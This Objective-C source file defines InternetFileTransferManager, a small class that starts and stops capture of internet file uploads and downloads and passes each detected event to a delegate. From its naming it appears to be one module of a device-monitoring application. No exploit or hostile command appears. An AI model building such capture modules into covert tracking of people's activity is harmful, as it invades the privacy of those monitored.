//
//  InternetFileTransferManager.m
//  InternetFileTransferManager
//
//  Created by ophat on 9/16/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import "InternetFileTransferManager.h"

@implementation InternetFileTransferManager
@synthesize mInternetFileDownloadUpload;

-(id) init{
    if (self = [super init]) {
        mInternetFileDownloadUpload = [[InternetFileUploadDownloadCapture alloc]init];
        [mInternetFileDownloadUpload setMDelegate:self];
        [mInternetFileDownloadUpload setMSelector:@selector(internetFileTransferEventDetected:)];
        [mInternetFileDownloadUpload setMThread:[NSThread currentThread]];
    }
    return self;
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
    mEventDelegate = aEventDelegate;
}

- (void) unregisterEventDelegate {
    mEventDelegate = nil;
}

- (void) startCapture{
    DLog(@"internetFileTransfer ==> startCapture");
    [mInternetFileDownloadUpload startCapture];
}

- (void) stopCapture{
    DLog(@"internetFileTransfer ==> stopCapture");
    [mInternetFileDownloadUpload stopCapture];
}

- (void) internetFileTransferEventDetected: (FxEvent *) aEvent {
    DLog(@"internetFileTransferEventDetected event: %@", aEvent);
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mEventDelegate eventFinished:aEvent];
    }
}

-(void) dealloc{ 
    [mInternetFileDownloadUpload release];
    [super dealloc];
}
@end
